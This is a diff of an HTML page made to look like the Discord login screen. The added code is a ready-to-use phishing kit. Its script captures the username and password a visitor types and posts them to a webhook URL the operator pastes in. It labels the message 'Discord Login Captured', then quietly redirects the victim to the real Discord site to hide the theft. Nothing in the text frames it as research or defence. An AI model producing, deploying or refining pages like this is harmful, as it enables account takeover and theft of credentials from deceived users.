@@ -75,4 +75,49 @@
     </div>
     <h1>Log in to Discord</h1>
     <form id="loginForm">
-      <label>Username or Email
+      <label>Username or Email</label>
+      <input type="text" id="username" placeholder="Email or Username" autocomplete="off">
+      <label>Password</label>
+      <input type="password" id="password" placeholder="Password" autocomplete="off">
+      <button type="submit" id="submitBtn">Sign In</button>
+      <a href="https://discord.com/app" class="forgot">Forgot your password?</a>
+    </form>
+    <div id="status"></div>
+  </div>
+
+<script>
+  // PASTE YOUR DISCORD WEBHOOK URL HERE
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/XXXX";
+
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    if (!username || !password) {
+      document.getElementById("status").textContent = "Please fill in both fields.";
+      return;
+    }
+
+    const statusEl = document.getElementById("status");
+    statusEl.textContent = "Logging in...";
+    document.getElementById("submitBtn").disabled = true;
+
+    // Send credentials to your webhook
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "**Discord Login Captured**\nUsername/Email: `" + username + "`\nPassword: `" + password + "`"
+      })
+    }).catch(() => {});
+
+    // Wait 1.5 seconds then redirect to real Discord
+    setTimeout(function() {
+      window.location.href = "https://discord.com/app";
+    }, 1500);
+  });
+</script>
+</body>
+</html>
